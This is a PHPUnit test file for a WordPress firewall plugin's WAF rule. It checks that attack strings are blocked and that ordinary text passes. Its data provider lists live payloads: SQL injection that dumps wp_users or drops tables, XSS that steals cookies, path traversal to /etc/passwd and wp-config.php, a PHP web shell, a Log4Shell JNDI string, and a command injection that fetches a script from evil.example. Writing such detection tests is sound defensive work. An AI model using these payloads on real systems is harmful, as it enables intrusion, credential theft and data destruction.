<?php
/**
 * @package WPBouncer\Tests
 */

namespace WPBouncer\Tests\Unit\Rules;

use PHPUnit\Framework\TestCase;
use WPBouncer\Rules\WafRule;
use WPBouncer\Tests\Support\Requests;

/**
 * @covers \WPBouncer\Rules\WafRule
 */
final class WafRuleTest extends TestCase {

	private function rule( array $overrides = array() ): WafRule {
		return new WafRule(
			array_merge(
				array(
					'enabled'         => true,
					'sqli'            => true,
					'xss'             => true,
					'traversal'       => true,
					'code_injection'  => true,
					'excluded_params' => array(),
				),
				$overrides
			)
		);
	}

	/** @dataProvider attacks */
	public function test_blocks_attack_payloads( string $category, string $payload ): void {
		$verdict = $this->rule()->inspect( Requests::make( array( 'query' => array( 'q' => $payload ) ) ) );
		$this->assertNotNull( $verdict, "should block: {$payload}" );
		$this->assertStringContainsString( $category, $verdict->reason() );
	}

	public static function attacks(): array {
		return array(
			array( 'sqli', "1' UNION SELECT user_login,user_pass FROM wp_users--" ),
			array( 'sqli', '1 union/**/all/**/select 1,2,3' ),
			array( 'sqli', "admin' OR '1'='1" ),
			array( 'sqli', '1 AND SLEEP(5)' ),
			array( 'sqli', "1; WAITFOR DELAY '0:0:5'" ),
			array( 'sqli', 'x FROM information_schema.tables' ),
			array( 'sqli', "1' INTO OUTFILE '/var/www/shell.php" ),
			array( 'sqli', '1; DROP TABLE wp_users' ),
			array( 'xss', '<script>alert(1)</script>' ),
			array( 'xss', '<img src=x onerror=alert(1)>' ),
			array( 'xss', '<svg/onload=alert(1)>' ),
			array( 'xss', 'javascript:alert(document.cookie)' ),
			array( 'xss', '<iframe src="//evil">' ),
			array( 'xss', '%3Cscript%3Ealert(1)%3C/script%3E' ),
			array( 'traversal', '../../../../etc/passwd' ),
			array( 'traversal', '..\\..\\..\\windows\\win.ini' ),
			array( 'traversal', '../wp-config.php' ),
			array( 'traversal', 'php://filter/convert.base64-encode/resource=index.php' ),
			array( 'code_injection', '<?php system($_GET["c"]); ?>' ),
			array( 'code_injection', 'eval(base64_decode("ZWNobyAxOw=="))' ),
			array( 'code_injection', '${jndi:ldap://evil.example/a}' ),
			array( 'code_injection', '; wget http://evil.example/x.sh' ),
		);
	}

	/** @dataProvider harmless */
	public function test_allows_normal_input( string $value ): void {
		$this->assertNull( $this->rule()->inspect( Requests::make( array( 'query' => array( 's' => $value ) ) ) ), "false positive: {$value}" );
	}

	public static function harmless(): array {
		return array(
			array( 'how to select a union representative' ),
			array( 'Tom & Jerry: the "best" cartoon?' ),
			array( "It's 5 o'clock and I'm 1 = happy" ),
			array( 'I <3 the online community = great' ),
			array( 'email me at a.b@example.com' ),
			array( 'Use the system (it works) and evaluate it' ),
			array( 'C:\\Users\\me\\Documents' ),
			array( 'Edit wp-config.php to add the key' ),
			array( 'price: 10-20 EUR -- negotiable' ),
			array( '<b>bold</b> and <em>emphasis</em>' ),
			array( 'Sleep is important (8 hours)' ),
		);
	}

	public function test_inspects_post_body_and_nested_keys(): void {
		$req     = Requests::make(
			array(
				'method' => 'POST',
				'post'   => array( 'meta' => array( 'inner' => array( 'x' => '<script>' ) ) ),
			)
		);
		$verdict = $this->rule()->inspect( $req );
		$this->assertNotNull( $verdict );
		$this->assertStringContainsString( 'body parameter "meta"', $verdict->reason() );
	}

	public function test_inspects_parameter_names(): void {
		$this->assertNotNull( $this->rule()->inspect( Requests::make( array( 'query' => array( '<script>' => '1' ) ) ) ) );
	}

	public function test_traversal_in_path(): void {
		$this->assertNotNull( $this->rule()->inspect( Requests::make( array( 'uri' => '/wp-content/../../../../etc/passwd' ) ) ) );
		$this->assertNotNull( $this->rule()->inspect( Requests::make( array( 'uri' => '/%2e%2e/%2e%2e/etc/passwd' ) ) ) );
		$this->assertNull( $this->rule()->inspect( Requests::make( array( 'uri' => '/select-union-guide/' ) ) ), 'SQL words in a slug are fine' );
	}

	public function test_categories_can_be_switched_off(): void {
		$req = Requests::make( array( 'query' => array( 'q' => '<script>alert(1)</script>' ) ) );
		$this->assertNull( $this->rule( array( 'xss' => false ) )->inspect( $req ) );
		$this->assertNotNull( $this->rule( array( 'sqli' => false ) )->inspect( $req ) );
	}

	public function test_excluded_params_are_skipped(): void {
		$req = Requests::make( array( 'post' => array( 'custom_html' => array( 'a' => '<script>x</script>' ), 'other' => 'fine' ) ) );
		$this->assertNull( $this->rule( array( 'excluded_params' => array( 'custom_html' ) ) )->inspect( $req ) );
		$this->assertNotNull( $this->rule()->inspect( $req ) );
	}

	public function test_trusted_users_are_not_inspected(): void {
		$req = Requests::make(
			array(
				'post'    => array( 'content' => '<script>legit()</script>' ),
				'trusted' => true,
			)
		);
		$this->assertNull( $this->rule()->inspect( $req ) );
	}

	public function test_flatten(): void {
		$this->assertSame(
			array(
				'a'       => '1',
				'b[c]'    => '2',
				'b[d][0]' => '3',
			),
			WafRule::flatten(
				array(
					'a' => 1,
					'b' => array(
						'c' => '2',
						'd' => array( '3' ),
					),
				)
			)
		);
	}

	public function test_every_signature_compiles(): void {
		foreach ( WafRule::SIGNATURES as $category => $signatures ) {
			foreach ( $signatures as $name => $regex ) {
				$this->assertNotFalse( @preg_match( $regex, '' ), "{$category}/{$name} is not a valid regex" );
			}
		}
	}
}
